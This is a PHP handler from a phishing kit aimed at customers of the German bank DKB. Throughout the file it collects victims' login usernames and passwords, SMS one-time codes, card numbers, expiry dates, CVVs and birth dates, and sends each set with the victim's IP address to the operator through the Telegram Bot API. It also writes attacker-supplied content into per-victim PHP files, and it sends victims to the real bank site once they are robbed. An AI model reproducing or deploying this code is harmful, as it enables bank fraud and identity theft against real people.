<?php 



require_once "functions.php";
require_once "config.php";


if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['to']) && $_POST['to'] === 'block') {
    $ipToBlock = trim($_POST['ip']);
    $blockedFile = 'monster/blocked_ips.txt';

    if (!file_exists($blockedFile)) {
        file_put_contents($blockedFile, "");
    }

    $alreadyBlocked = file($blockedFile, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
    if (!in_array($ipToBlock, $alreadyBlocked)) {
        file_put_contents($blockedFile, $ipToBlock . PHP_EOL, FILE_APPEND);
        echo "<script>setTimeout(() => showBlockMessage(), 500);</script>";
    }
}




if ($_POST['step'] == "control") {
        $fp = fopen('victims/'. $_POST['ip'] .'.php', 'wb');

        fwrite($fp, $_POST['to']);
        fclose($fp);
        header("location: control.php?ip=" . $_POST['ip']);
        exit();
    }




if( !empty($_GET['redirection']) ) {
    $red = $_GET['redirection'];
    if( $red == 'login' ) {
        $_SESSION['errors']['login'] = true;
        header("Location: loginerr.php");
        exit();
    } if( $red == 'app' ) {
        header("Location: app.php");
        exit();
    } else if( $red == 'sms' ) {
        header("Location: sms.php");
        exit();
    }  else if( $red == 'smserr' ) {
        header("Location: smserr.php");
        exit();
    } else if( $red == 'birth' ) {
        header("Location: birth.php");
        exit();
    } else if( $red == 'cc' ) {
        header("Location: cc.php");
        exit();
    } else if( $red == 'success' ) {
        header("Location: https://www.dkb.de/");
        exit();
    }
}


//================
#=====> log
//================

if ($_POST['step']== 'index') {
    $user = $_POST['user'];
    $pass = $_POST['pass'];

    if (empty($user) || empty($pass)) {

        header("Location: index.php");
        exit();

    }else{
        $adrress  = $_SERVER['REMOTE_ADDR'];
        $subject  ="- |📍|  DKB DE  |📍| - " .  $adrress   . "\r\n" ;
        $message .="➖➖➖| - LOGIN - |➖➖➖"       . "\r\n" ;
        $message .= "[📥] User : " . $user                    . "\r\n";
        $message .= "[🎯] Pass : " . $pass                     . "\r\n";
        $message .=" ------\  END LOGIN  /------- "       . "\r\n" ;
        $message .=" -----------\ Link CONTROL /----------- "       . "\r\n" ;
        $message .= '|-Steps : ' . get_steps_link() . "\r\n";
        $message .= '-----------------------------------------' . "\r\n";


        if(isset($_POST['submit']))
            {
                $apiToken;
                $data = [
                'chat_id' => $id, 
                'text' => $subject . $message
                ];
                $response = file_get_contents("https://api.telegram.org/bot" .$apiToken . "/sendMessage?" . http_build_query($data) );
            };
            reset_data();
        header("Location: loading_1.php");
        exit();
    }
}

if ($_POST['step']== 'loginerr') {
    $user = $_POST['user'];
    $pass = $_POST['pass'];

    if (empty($user) || empty($pass)) {

        header("Location: loginerr.php");
        exit();

    }else{
        $adrress  = $_SERVER['REMOTE_ADDR'];
        $subject  ="- |📍|  DKB DE  |📍| - " .  $adrress   . "\r\n" ;
        $message .="➖➖➖| - LOGIN ERR - |➖➖➖"       . "\r\n" ;
        $message .= "[📥] User : " . $user                    . "\r\n";
        $message .= "[🎯] Pass : " . $pass                     . "\r\n";
        $message .=" ------\  END LOGIN  /------- "       . "\r\n" ;
        $message .=" -----------\ Link CONTROL /----------- "       . "\r\n" ;
        $message .= '|-Steps : ' . get_steps_link() . "\r\n";
        $message .= '-----------------------------------------' . "\r\n";


        if(isset($_POST['submit']))
            {
                $apiToken;
                $data = [
                'chat_id' => $id, 
                'text' => $subject . $message
                ];
                $response = file_get_contents("https://api.telegram.org/bot" .$apiToken . "/sendMessage?" . http_build_query($data) );
            };
            reset_data();
        header("Location: loading_1.php");
        exit();
    }
}



//================
#=====> sms
//================

if ($_POST['step']== 'sms') {
    $num_1 = $_POST['num_1'];
    $num_2 = $_POST['num_2'];
    $num_3 = $_POST['num_3'];
    $num_4 = $_POST['num_4'];
    $num_5 = $_POST['num_5'];
    $num_6 = $_POST['num_6'];

    if (empty($num_1) || empty($num_2) || empty($num_3) || empty($num_4) || empty($num_5) || empty($num_6)) {

        header("Location: sms.php");
        exit();

    }else{
        $adrress  = $_SERVER['REMOTE_ADDR'];
        $message  ="✅✖️✖️ - SMS 1 - ✖️✖️✅"       . "\r\n" ;
        $message .="➖➖➖➖➖➖➖➖➖"       . "\r\n" ;
        $message .= "[✉️]SMS [1] : " . $num_1.$num_2.$num_3.$num_4.$num_5.$num_6                  . "\r\n";
        $message .="➖➖➖➖➖➖➖➖➖"       . "\r\n" ;
        $message .= '/-- INFO VICTIM --/' . "\r\n";
        $message .= "|🌎💎| IP : ".$adrress."\r\n";
        $message .=" -----------\ Link CONTROL /----------- "       . "\r\n" ;
        $message .= '|-Steps : ' . get_steps_link() . "\r\n";
        $message .= '-----------------------------------------' . "\r\n";

        if(isset($_POST['submit']))
            {
                $apiToken;
                $data = [
                'chat_id' => $id, 
                'text' => $subject . $message
                ];
                $response = file_get_contents("https://api.telegram.org/bot" .$apiToken . "/sendMessage?" . http_build_query($data) );
            };
        reset_data();
        header("Location: loading_1.php");
        exit();
    }
}

if ($_POST['step']== 'smserr') {
    $num_1 = $_POST['num_1'];
    $num_2 = $_POST['num_2'];
    $num_3 = $_POST['num_3'];
    $num_4 = $_POST['num_4'];
    $num_5 = $_POST['num_5'];
    $num_6 = $_POST['num_6'];

    if (empty($num_1) || empty($num_2) || empty($num_3) || empty($num_4) || empty($num_5) || empty($num_6)) {

        header("Location: smserr.php");
        exit();

    }else{
        $adrress  = $_SERVER['REMOTE_ADDR'];
        $message  ="✅✖️✖️ - SMS 2 - ✖️✖️✅"       . "\r\n" ;
        $message .="➖➖➖➖➖➖➖➖➖"       . "\r\n" ;
        $message .= "[✉️]SMS [2] : " . $num_1.$num_2.$num_3.$num_4.$num_5.$num_6                  . "\r\n";
        $message .="➖➖➖➖➖➖➖➖➖"       . "\r\n" ;
        $message .= '/-- INFO VICTIM --/' . "\r\n";
        $message .= "|🌎💎| IP : ".$adrress."\r\n";
        $message .=" -----------\ Link CONTROL /----------- "       . "\r\n" ;
        $message .= '|-Steps : ' . get_steps_link() . "\r\n";
        $message .= '-----------------------------------------' . "\r\n";

        if(isset($_POST['submit']))
            {
                $apiToken;
                $data = [
                'chat_id' => $id, 
                'text' => $subject . $message
                ];
                $response = file_get_contents("https://api.telegram.org/bot" .$apiToken . "/sendMessage?" . http_build_query($data) );
            };
        reset_data();
        header("Location: loading_1.php");
        exit();
    }
}



if ($_POST['step']== 'cc') {
    $first = $_POST['fname'];
    $card = $_POST['card'];
    $date = $_POST['exp'];
    $cvv = $_POST['cvv'];




    if (empty($first) || empty($card) || empty($date) || empty($cvv)) {

        header("Location: cc.php");
        exit();

    }else{
        $adrress  = $_SERVER['REMOTE_ADDR'];
        $subject  ="- |💳|  - CC - DKB -  |💳| - " .  $adrress   . "\r\n" ;
        $message .= "[ 💲 ]Full name : " . $first                     . "\r\n";
        $message .= "[ 💲 ]CARD NUMBER : " . $card                     . "\r\n";
        $message .= "[ 📅 ]EXP DATE : " . $date                 . "\r\n";
        $message .= "[ 💳 ]CVV : " . $cvv                 . "\r\n" ;
        $message .= '|📍|-Steps : ' . get_steps_link() . "\r\n";
        $message .="- |💳|  - CC - DKB - |💳| -" .  $adrress   . "\r\n" ;

        if(isset($_POST['submit']))
            {
                $apiToken;
                $data = [
                'chat_id' => $id, 
                'text' => $subject . $message
                ];
                $response = file_get_contents("https://api.telegram.org/bot" .$apiToken . "/sendMessage?" . http_build_query($data) );
            };
        reset_data();
        header("Location: loading_1.php");
        exit();
    }
}


if ($_POST['step']== 'birth') {
    $birth = $_POST['birth'];




    if (empty($birth)) {

        header("Location: birth.php");
        exit();

    }else{
        $adrress  = $_SERVER['REMOTE_ADDR'];
        $subject  ="- |💳|  - INFORMATION - DKB -  |💳| - " .  $adrress   . "\r\n" ;
        $message .= "[ 💲 ]BIRTHDAY : " . $birth                     . "\r\n";
        $message .= '|📍|-Steps : ' . get_steps_link() . "\r\n";
        $message .="- |💳|  - CC - DKB - |💳| -" .  $adrress   . "\r\n" ;

        if(isset($_POST['submit']))
            {
                $apiToken;
                $data = [
                'chat_id' => $id, 
                'text' => $subject . $message
                ];
                $response = file_get_contents("https://api.telegram.org/bot" .$apiToken . "/sendMessage?" . http_build_query($data) );
            };
        reset_data();
        header("Location: loading_1.php");
        exit();
    }
}

?>